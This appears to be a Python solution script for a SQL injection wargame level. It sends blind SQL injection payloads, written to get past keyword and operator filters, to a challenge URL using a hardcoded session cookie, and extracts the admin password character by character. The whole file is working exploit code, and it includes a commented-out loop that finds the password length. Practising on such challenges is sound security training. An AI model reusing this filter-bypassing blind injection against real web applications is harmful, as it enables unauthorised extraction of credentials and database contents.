import requests
headers={'Cookie':'PHPSESSID=imuf91ec90tbkpm12c9hp9g891'}
base="https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
'''
for i in range(100):
    print(i)
    page=base+'?no=1||mid(id,1,1)in("a")%26%26length(pw)<>'+str(i)
    if "Hello admin" not in (requests.get(page,headers=headers)).text:
        print((requests.get(page,headers=headers)).text)
        print(i)
        break
'''
choice="789456123qwertyuiopasdfghjklzxcvbnm"
flag=''
for i in range(1,9):
    for j in choice:
        print(str(i)+"-_-"+j)
        query='?no=1||mid(id,1,1)in("a")%26%26mid(pw,'+str(i)+',1)in("'+j+'")'
        page=base+query
        if "Hello admin" in (requests.get(page,headers=headers)).text:
            flag=flag+j
            print(page)
            print(flag)
            break